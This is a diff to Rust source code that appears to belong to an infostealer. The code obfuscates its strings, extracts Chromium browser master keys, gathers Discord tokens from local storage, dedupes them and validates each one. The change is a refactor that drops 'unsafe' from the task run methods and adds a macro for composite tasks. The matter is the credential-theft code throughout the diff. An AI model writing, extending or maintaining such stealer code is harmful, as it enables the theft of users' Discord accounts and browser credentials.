@@ -7,7 +7,7 @@ use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
-use tasks::{parent_name, CompositeTask, Task};
+use tasks::{impl_composite_task_runner, parent_name, CompositeTask, Task};
 use utils::base64::base64_decode;
 use utils::browsers::chromium;
 use utils::browsers::chromium::extract_master_key;
@@ -18,7 +18,7 @@ struct TokenValidationTask {
 }
 
 impl<C: Collector> Task<C> for TokenValidationTask {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let Some(info) = get_token_info(self.token.clone()) else {
             return
         };
@@ -49,18 +49,14 @@ impl<C: Collector> TokenWriterTask<C> {
     }
 }
 
-impl<C: Collector> Task<C> for TokenWriterTask<C> {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
-        self.inner.run(parent, collector);
-    }
-}
+impl_composite_task_runner!(TokenWriterTask<C>);
 
 pub(super) struct DiscordTask;
 
 impl<C: Collector> Task<C> for DiscordTask {
     parent_name!("Discord");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let mut tokens = collect_tokens(&get_discord_paths());
         tokens.sort();
         tokens.dedup();
